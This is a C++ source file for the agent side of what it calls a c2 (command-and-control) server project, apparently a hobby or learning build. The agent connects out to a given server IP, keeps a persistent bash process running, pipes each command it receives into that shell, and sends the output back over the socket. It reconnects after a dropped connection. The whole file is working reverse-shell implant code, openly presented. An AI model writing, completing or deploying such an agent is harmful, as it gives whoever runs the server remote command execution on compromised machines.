#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdlib>
#include <csignal>
#include <print>
#include "packet.hpp"
#include "agent.hpp"
#include "common.hpp"
#include "PersistentShell.hpp"
// #include <openssl/ssl.h> // using openssl to encrypt the open socket communication
// #include <openssl/err.h>

void common::code_exit(){
    std::cout << "[*]Corrupted data exiting program...." << std::endl;
    exit(EXIT_FAILURE);
}


// void common::receive_failed(int connection_status){
//     if(connection_status < 0){
//         std::perror( "[*]connection failed to establish between c2 server and agent");
//         std::cout << std::endl;
//         return;
//     }
// }


void common::socket_check(int soc_fd){
    if(soc_fd < 0){
        std::perror("[*]socket creation failed");
        std::cout << std::endl;
        exit(EXIT_FAILURE);
    }
}


void common::connection_failed(int connection_status){
    if(connection_status == 0){
        std::perror("[-]server disconnected connection");
        std::cout << std::endl;
        exit(EXIT_FAILURE);
    }
    else{
        std::perror("[-]receive failed");
        std::cout << std::endl;
    }
}


void common::inet_ntop_failed(int client_fd){
    std::perror("[!]failed to convert agent ip address to human readable string");
    std::cout << std::endl;
    close(client_fd);
}



bool agent::send_all(int client_fd, const void *data, size_t length){
    size_t total_bytes_sent = 0;
    while(total_bytes_sent < length){
        ssize_t bytes_sent = send(client_fd, static_cast<const char*>(data)+total_bytes_sent, length-total_bytes_sent, 0);
        if(bytes_sent <= 0){
            return false;
        }
        total_bytes_sent = total_bytes_sent + bytes_sent;
    }
    return true;
}



bool agent::recv_all(int client_fd, void *buffer, size_t length){
    size_t total_bytes_received = 0;
    while(total_bytes_received < length){
        ssize_t bytes_received = recv(client_fd, static_cast<char *>(buffer) + total_bytes_received, length - total_bytes_received, 0);
        if(bytes_received <= 0)
            return false;
        total_bytes_received = total_bytes_received + bytes_received;
    }
    return true;
}



std::vector<uint8_t> serialization(const packet &p1){ // CURRENTLY NOT USED !!! BUT WILL BE USED WHEN COMMAND SENT WILL BE IMPLEMENTED
    size_t total_size = 
        sizeof(uint32_t) + // message_type
        sizeof(uint32_t) + // session_id
        sizeof(uint32_t) + // payload_length
        p1.payload.size(); // payload
    
    std::vector<uint8_t> byte_array(total_size); // memory allocated
    uint8_t *byte_array_ptr = byte_array.data(); // in vector arrays .data() gives the address of the first element 
    if(byte_array_ptr == nullptr){ // if memory not allocated to vector array the if condition will be true
        common::code_exit();
    } 

    // converting the pacsession_idket_bytes (unsigned integers) to network bytes or big endian
    uint32_t message_type = htonl(p1.message_type);
    uint32_t session_id = htonl(p1.session_id);
    uint32_t payload_length = htonl(p1.payload.size());

    // copying this data to the vector array using memset
    // memcpy arguments => memcpy(arg1 = addr. of where to copy data, addr. of what to copy, sizeof(the data to copy))
    std::memcpy( // message_type copy
        byte_array_ptr, 
        &message_type,
        sizeof(message_type)
    );
    byte_array_ptr += sizeof(message_type); // increment the vector array pointer to copy the data in correct positions
    std::memcpy( // session_id copy
        byte_array_ptr,
        &session_id,
        sizeof(session_id)
    );
    byte_array_ptr += sizeof(session_id);
    std::memcpy(
        byte_array_ptr,
        &payload_length,
        sizeof(payload_length)
    );
    byte_array_ptr += sizeof(payload_length);
    std::memcpy(
        byte_array_ptr,
        p1.payload.data(),
        p1.payload.size()
    );
    return byte_array;
}



packet deserialization_payload_header(const uint8_t payload_header[]){ // convert the raw bytes of payload header and store the actual data into a structure variable
/*
+-------------+-------------+-------------+----------------+
| Message Type|  Session ID | Payload Len |    Payload     |
|   4 bytes   |   4 bytes   |   4 bytes   | variable size  |
+-------------+-------------+-------------+----------------+
*/
    packet p1{}; // initializing the struct values to 0
    uint32_t message_type;
    uint32_t session_id;
    uint32_t payload_length;

    // reading message_type
    std::memcpy(
        &message_type,
        payload_header,
        sizeof(message_type)
    );
    // increment pointer to read correct data based on the value we need to store
    payload_header += sizeof(message_type);
    // reading session_id
    std::memcpy(
        &session_id,
        payload_header,
        sizeof(session_id)
    );
    payload_header += sizeof(session_id);
    // reading payload_length
    std::memcpy(
        &payload_length,
        payload_header,
        sizeof(payload_length)
    );
    // converting the data from network byte order to little endian byte order
    p1.message_type = ntohl(message_type);
    p1.session_id = ntohl(session_id);
    p1.payload_length = ntohl(payload_length);
    return p1;
}



std::string deserialization_payload(const uint8_t* payload, size_t payload_size){ // convert the raw bytes of payload command to human readable command and return the command
    return std::string(reinterpret_cast<const char *>(payload), payload_size);
}


/* handle_test_command removed — real shell execution handled by PersistentShell */


bool agent::validate_ipaddress(std::string server_ip){
/*    
- Split the string by the dot (.) character.
- Count the parts to make sure there are exactly four pieces.
- Check each part to ensure it contains only digits.
- Convert each part to an integer and check if it is between 0 and 255.
- Check for leading zeros (like 01 or 007), which are usually invalid in standard IPv4 addresses.
*/
    std::cout << "[*] validating ip address of server..." << std::endl;
    std::vector<std::string> split_ip;
    std::stringstream test_ip(server_ip);
    std::string ip_part;
    while(std::getline(test_ip, ip_part, '.')){ // spling the ip address based on the dots(.)
        split_ip.push_back(ip_part);
    }
    if(split_ip.size() != 4) // count how many parts (total 4 should be there for IPV4 address)
        return false;
    for(const std::string& parts: split_ip){ // iterate through the ip parts and check whether integer or not
        if(parts.empty())return false; // edge cases where input could be for eg:- 192..28..1.0
        if(parts.length() > 1 && parts[0] == '0')return false; // check for leading zeroes
        for(char part : parts){ // parts contains each element from the spli_ip list and part takes one character from the entire string like for example from "192" part takes '1' so isdigit only takes positive elements from 0-9 so char is signed henced making it unsigned is necessary using static_cast 
            if(!std::isdigit(static_cast<unsigned char>(part)))
                return false;
        }
        int num = std::atoi(parts.c_str()); // convert the "192" part of the string to decimal and store in num
        if(num < 0 || num > 255)
            return false;
    }
    std::cout << "[+] server ip address validated" << std::endl;
    return true;
}


void agent::receive_commands(std::string SERVER_IP){
    /*
     * A shell can disappear between is_alive() and write_input().  Ignore
     * SIGPIPE so PersistentShell can report EPIPE to this dispatch loop
     * instead of terminating the agent process.
     */
    std::signal(SIGPIPE, SIG_IGN);

    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET; // IPv4 address
    if(inet_pton(AF_INET, SERVER_IP.c_str(), &server_address.sin_addr) <= 0){ // convert IP_address string to raw binary data in network byte order
        std::cout << "[!]invalid server IP" << std::endl;
        return;
    }
    server_address.sin_port = htons(AGENT_PORT); // port 1234 assigned
    //char server_response[100];
    // payload header storage
    // we using &byte_array 
    // although might seem byte_array would work cuz array is a pointer. but byte_array is vector object first so we need point to that vector object's address
    constexpr size_t HEADER_SIZE = 12;
    while(true){
        int client_fd = socket(AF_INET, SOCK_STREAM, 0);
        common::socket_check(client_fd);
        if(connect(client_fd, (struct sockaddr*)&server_address, sizeof(server_address)) == 0){
            std::cout << "[+] connected to server" << std::endl;
            while(true){
                uint8_t payload_header[HEADER_SIZE];
                if(!recv_all(client_fd, payload_header, HEADER_SIZE)){
                    std::cout << "[!] failed to receive packet header" << std::endl;
                    close(client_fd);
                    return;
                }
                packet received_packet = deserialization_payload_header(payload_header);
                
                // FOR DEBUGGING PURPOSE ONLY
                std::cout << "[+] AGENT MESSAGE_TYPE: " << received_packet.message_type << std::endl;
                std::cout << "[+] SESSION_ID: " << received_packet.session_id << std::endl;
                std::cout << "[+] PAYLOAD_LENGTH: " << received_packet.payload_length << std::endl;

                // getting the payload using the payload length
                if(received_packet.payload_length > 0){
                    std::vector<uint8_t> payload(received_packet.payload_length);
                    if(!recv_all(client_fd, payload.data(), payload.size())){
                        std::cout << "[!] failed to receive payload" << std::endl;
                        close(client_fd);
                        break;
                    }
                    received_packet.payload = deserialization_payload(payload.data(), payload.size());
                    std::cout << "[+] PAYLOAD: " << received_packet.payload << std::endl;
                }
                if(received_packet.message_type == MESSAGE_SHELL_START){
                    std::cout << "[*] MESSAGE_SHELL_START received for session "
                              << received_packet.session_id << std::endl;

                    packet response{};
                    response.session_id = received_packet.session_id;

                    if(session.active){
                        /* Shell already running — do not create a second one */
                        std::cout << "[!] Shell already active for session "
                                  << session.session_id << " — ignoring duplicate start" << std::endl;
                        response.message_type = MESSAGE_SHELL_ACK;
                        response.payload     = "[+] persistent shell already active";
                    } else {
                        /* ── Start the persistent bash child ──────────────── */
                        if(shell_.start()){
                            session.active     = true;
                            session.session_id = received_packet.session_id;
                            std::cout << "[+] PersistentShell started for session "
                                      << session.session_id << std::endl;
                            response.message_type = MESSAGE_SHELL_ACK;
                            response.payload      = "[+] persistent shell started";
                        } else {
                            /* fork/pipe/exec failed — report error, leave session inactive */
                            std::cout << "[-] PersistentShell::start() failed" << std::endl;
                            response.message_type = MESSAGE_ERROR;
                            response.payload      = "[-] failed to start shell process";
                        }
                    }

                    response.payload_length = response.payload.size();
                    std::vector<uint8_t> serialized = serialization(response);
                    if(!send_all(client_fd, serialized.data(), serialized.size())){
                        std::cout << "[!] failed to send SHELL_ACK to server" << std::endl;
                        close(client_fd);
                        return;
                    }
                    std::cout << "[+] SHELL_ACK sent to server" << std::endl;
                }
                else if(received_packet.message_type == MESSAGE_SHELL_DATA){
                    std::cout << "[*] MESSAGE_SHELL_DATA received for session "
                              << received_packet.session_id << std::endl;

                    packet response{};
                    response.session_id = received_packet.session_id;

                    if(!session.active ||
                       received_packet.session_id != session.session_id ||
                       !shell_.is_alive()){
                        /* Guard: no shell running */
                        std::cout << "[!] SHELL_DATA received but no active shell" << std::endl;
                        if(session.active && !shell_.is_alive()){
                            shell_.stop();
                            session.active = false;
                            session.session_id = 0;
                        }
                        response.message_type = MESSAGE_ERROR;
                        response.payload      = "[-] no active shell session";
                    } else {
                        std::cout << "[*] Passing command to PersistentShell: "
                                  << received_packet.payload << std::endl;

                        /* ── Write to the SAME bash process ──────────────── */
                        if(!shell_.write_input(received_packet.payload)){
                            /* write failed — child likely died */
                            std::cout << "[-] write_input failed — shell may have exited" << std::endl;
                            shell_.stop();
                            session.active = false;
                            session.session_id = 0;
                            response.message_type = MESSAGE_ERROR;
                            response.payload      = "[-] shell write failed";
                        } else {
                            /* ── Collect output from the SAME bash process ── */
                            std::string output = shell_.read_available_output();

                            if(output.empty()) output = "";

                            /* If shell died during output collection, update state */
                            if(!shell_.is_alive()){
                                std::cout << "[!] Shell exited during command execution" << std::endl;
                                shell_.stop();
                                session.active = false;
                                session.session_id = 0;
                            }

                            response.message_type = MESSAGE_OUTPUT;
                            response.payload      = output;
                            std::cout << "[+] Output collected (" << output.size()
                                      << " bytes)" << std::endl;
                        }
                    }

                    response.payload_length = response.payload.size();
                    std::vector<uint8_t> serialized = serialization(response);
                    if(!send_all(client_fd, serialized.data(), serialized.size())){
                        std::cout << "[!] failed to send MESSAGE_OUTPUT to server" << std::endl;
                        close(client_fd);
                        return;
                    }
                    std::cout << "[+] Output sent to server" << std::endl;
                }
                else if(received_packet.message_type == MESSAGE_SHELL_EXIT){
                    std::cout << "[*] MESSAGE_SHELL_EXIT received for session "
                              << received_packet.session_id << std::endl;

                    packet response{};
                    response.session_id     = received_packet.session_id;

                    if(!session.active ||
                       received_packet.session_id != session.session_id){
                        response.message_type = MESSAGE_ERROR;
                        response.payload = "[-] no matching active shell session";
                    } else {
                        /* ── Stop the persistent bash child ────────────── */
                        shell_.stop();      /* exit → SIGTERM → SIGKILL if needed */
                        session.active     = false;
                        session.session_id = 0;
                        std::cout << "[+] PersistentShell stopped, session cleared" << std::endl;
                        response.message_type = MESSAGE_OUTPUT;
                        response.payload = "[+] Shell closed";
                    }
                    response.payload_length = response.payload.size();
                    std::vector<uint8_t> serialized = serialization(response);
                    if(!send_all(client_fd, serialized.data(), serialized.size())){
                        std::cout << "[!] failed to send SHELL_EXIT response to server" << std::endl;
                    } else {
                        std::cout << "[+] Shell exit acknowledgement sent to server" << std::endl;
                    }
                    /* Socket connection remains alive for future sessions */
                }
            }
            std::cout << "[*]attempting to reconnect..." << std::endl; // if payload receiving fails then connection is retried
        }
        else{
            close(client_fd);
            std::cout << "[!]agent couldn't connect to server" << std::endl;
            break;
        }
    }
}
